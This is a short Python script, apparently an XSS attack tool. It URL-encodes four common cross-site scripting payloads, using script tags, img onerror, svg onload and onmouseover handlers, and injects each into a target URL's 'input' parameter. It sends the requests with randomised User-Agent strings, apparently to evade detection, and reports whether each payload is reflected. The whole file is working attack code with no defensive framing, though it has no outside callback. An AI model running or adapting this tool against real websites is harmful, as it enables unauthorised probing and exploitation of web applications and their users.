import requests
import random
from urllib.parse import quote
from fake_useragent import UserAgent

def get_random_user_agent():
    ua = UserAgent()
    return ua.random

def encode_payload(payload):
    return quote(payload)

def xss_attack(url, payloads, session):
    for payload in payloads:
        encoded_payload = encode_payload(payload)
        target_url = f"{url}?input={encoded_payload}"
        headers = {'User-Agent': get_random_user_agent()}
        
        try:
            response = session.get(target_url, headers=headers)
            if payload in response.text:
                print(f"XSS attack successful at: {target_url} with payload: {payload}")
            else:
                print(f"XSS failed at: {target_url}, status code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error during XSS attack: {e}")

def start_xss_attack(url, session):
    payloads = [
        "<script>alert('XSS');</script>",
        "<img src='x' onerror='alert(1)'>",
        "<svg onload=alert('XSS')>",
        "<a href='#' onmouseover=alert('XSS')>Click Me</a>"
    ]
    xss_attack(url, payloads, session)
